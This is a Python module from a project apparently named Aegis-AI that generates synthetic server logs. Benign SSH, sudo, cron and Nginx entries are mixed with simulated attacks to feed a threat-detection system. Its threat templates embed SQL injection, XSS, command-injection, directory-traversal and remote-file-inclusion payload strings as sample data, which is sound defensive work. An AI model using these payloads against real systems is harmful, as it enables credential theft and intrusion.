"""
Aegis-AI Log Generator
======================
Purpose: Simulate realistic server logs with embedded cyber attack patterns
Author: Aditya Batra

This module generates:
- Legitimate Linux auth logs (SSH, sudo, cron)
- Nginx access logs (HTTP requests)
- Simulated attacks: SQL Injection, XSS, Brute Force, Directory Traversal
"""

import os
import time
import random
import logging
from datetime import datetime
from typing import List, Tuple

from faker import Faker
from database import DatabaseManager

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

fake = Faker()


class LogGenerator:
    """
    Intelligent log generator simulating a production Linux server.

    Generates a realistic mix of:
    - 70% benign traffic (normal operations)
    - 20% suspicious activity (reconnaissance, probing)
    - 10% critical threats (active attacks)
    """

    def __init__(self, db: DatabaseManager):
        """
        Initialize the log generator.

        Args:
            db: Database manager instance
        """
        self.db = db

        # Threat actor simulation: Persistent IP addresses for attack campaigns
        self.known_attackers = [
            "45.142.212.61",  # Known VPS provider
            "185.220.101.42",  # Tor exit node
            "103.253.145.28",  # Suspicious Asian IP range
        ]

        # Legitimate users for normal activity
        self.legitimate_ips = [
            "192.168.1.100",
            "192.168.1.101",
            "10.0.0.5",
            "172.16.0.10",
        ]

    def generate_benign_log(self) -> Tuple[str, str, str]:
        """
        Generate normal, legitimate server log entry.

        Returns:
            Tuple of (log_level, source_ip, message)
        """
        templates = [
            # SSH authentication success
            ("INFO", random.choice(self.legitimate_ips),
             f"sshd[{random.randint(1000, 9999)}]: Accepted publickey for {fake.user_name()} from {random.choice(self.legitimate_ips)} port {random.randint(50000, 60000)} ssh2"),

            # Sudo command execution
            ("INFO", random.choice(self.legitimate_ips),
             f"sudo: {fake.user_name()} : TTY=pts/{random.randint(0, 5)} ; PWD=/home/{fake.user_name()} ; USER=root ; COMMAND=/usr/bin/apt update"),

            # Nginx successful request
            ("INFO", fake.ipv4_public(),
             f"GET /api/v1/users HTTP/1.1 200 {random.randint(200, 5000)} {fake.user_agent()}"),

            # Cron job execution
            ("INFO", "127.0.0.1",
             f"CRON[{random.randint(1000, 9999)}]: (root) CMD (/usr/local/bin/backup.sh)"),

            # Service start
            ("INFO", "127.0.0.1",
             f"systemd[1]: Started {random.choice(['nginx', 'postgresql', 'redis', 'docker'])}.service"),
        ]

        return random.choice(templates)

    def generate_suspicious_log(self) -> Tuple[str, str, str]:
        """
        Generate suspicious activity that warrants investigation.

        These aren't confirmed attacks but show reconnaissance/probing behavior.

        Returns:
            Tuple of (log_level, source_ip, message)
        """
        attacker_ip = random.choice(self.known_attackers + [fake.ipv4_public()])

        templates = [
            # Multiple failed login attempts (brute force attempt)
            ("WARNING", attacker_ip,
             f"sshd[{random.randint(1000, 9999)}]: Failed password for root from {attacker_ip} port {random.randint(40000, 50000)} ssh2"),

            # Scanning for admin panels
            ("WARNING", attacker_ip,
             f"GET /admin HTTP/1.1 404 145 Mozilla/5.0"),

            # Probing for vulnerabilities
            ("WARNING", attacker_ip,
             f"GET /phpMyAdmin/index.php HTTP/1.1 404 145 {fake.user_agent()}"),

            # Port scanning activity
            ("WARNING", attacker_ip,
             f"Connection attempt on port {random.choice([22, 3306, 5432, 6379])} from {attacker_ip} - REJECTED"),

            # Directory traversal attempt (mild)
            ("WARNING", attacker_ip,
             f"GET /../../../../etc/passwd HTTP/1.1 403 172 {fake.user_agent()}"),
        ]

        return random.choice(templates)

    def generate_threat_log(self) -> Tuple[str, str, str]:
        """
        Generate logs representing active cyber attacks.

        These are clear indicators of malicious intent and should trigger alerts.

        Returns:
            Tuple of (log_level, source_ip, message)
        """
        attacker_ip = random.choice(self.known_attackers)

        # SQL Injection patterns
        sqli_payloads = [
            "' OR '1'='1",
            "1' UNION SELECT NULL, username, password FROM users--",
            "admin'--",
            "1' AND 1=1--",
            "; DROP TABLE users; --",
        ]

        # XSS patterns
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert(document.cookie)",
            "<svg/onload=alert('XSS')>",
        ]

        # Command injection patterns
        cmd_injection = [
            "; cat /etc/passwd",
            "| ls -la /root",
            "&& whoami",
            "`id`",
        ]

        templates = [
            # SQL Injection attack
            ("ERROR", attacker_ip,
             f"POST /api/login HTTP/1.1 - SQL Injection attempt detected: username={random.choice(sqli_payloads)}"),

            # XSS attack
            ("ERROR", attacker_ip,
             f"GET /search?q={random.choice(xss_payloads)} HTTP/1.1 400 - XSS payload detected"),

            # Command injection
            ("CRITICAL", attacker_ip,
             f"POST /api/execute HTTP/1.1 - Command injection attempt: cmd={random.choice(cmd_injection)}"),

            # Brute force attack (rapid attempts)
            ("CRITICAL", attacker_ip,
             f"sshd[{random.randint(1000, 9999)}]: CRITICAL: 50+ failed login attempts from {attacker_ip} in 60 seconds - BLOCKED"),

            # Reverse shell attempt
            ("CRITICAL", attacker_ip,
             f"Firewall blocked outbound connection to {attacker_ip}:4444 - Suspected reverse shell"),

            # Sensitive file access
            ("ERROR", attacker_ip,
             f"GET /../../../etc/shadow HTTP/1.1 403 - Directory traversal blocked"),

            # LFI/RFI attempt
            ("ERROR", attacker_ip,
             f"GET /index.php?page=http://{attacker_ip}/shell.txt HTTP/1.1 403 - Remote file inclusion blocked"),
        ]

        return random.choice(templates)

    def generate_log(self):
        """
        Generate a single log entry with weighted probability.

        Distribution:
        - 70% benign (normal operations)
        - 20% suspicious (reconnaissance)
        - 10% critical threats (attacks)
        """
        rand = random.random()

        if rand < 0.70:
            # Benign traffic
            log_level, source_ip, message = self.generate_benign_log()
        elif rand < 0.90:
            # Suspicious activity
            log_level, source_ip, message = self.generate_suspicious_log()
        else:
            # Critical threat
            log_level, source_ip, message = self.generate_threat_log()

        # Insert into database
        try:
            log_id = self.db.insert_log(
                log_level=log_level,
                source_ip=source_ip,
                message=message
            )
            logger.info(f"✅ Generated {log_level} log [ID: {log_id}] from {source_ip}")
        except Exception as e:
            logger.error(f"❌ Failed to insert log: {e}")

    def run(self, interval: int = 2):
        """
        Continuous log generation loop.

        Args:
            interval: Seconds to wait between log generations
        """
        logger.info(f"🚀 Log Generator started - generating logs every {interval}s")
        logger.info(f"📊 Distribution: 70% benign, 20% suspicious, 10% threats")

        try:
            while True:
                self.generate_log()
                time.sleep(interval)
        except KeyboardInterrupt:
            logger.info("🛑 Log Generator stopped by user")
        except Exception as e:
            logger.error(f"❌ Log Generator crashed: {e}")
            raise


def main():
    """Entry point for the log generator service."""
    # Wait for database to be ready
    logger.info("⏳ Waiting for database connection...")
    time.sleep(5)

    # Initialize database connection
    db = DatabaseManager()

    # Verify connection
    if not db.health_check():
        logger.error("❌ Database health check failed. Exiting.")
        return

    # Start generation
    generator = LogGenerator(db)
    interval = int(os.getenv("LOG_GENERATION_INTERVAL", 2))
    generator.run(interval=interval)


if __name__ == "__main__":
    main()
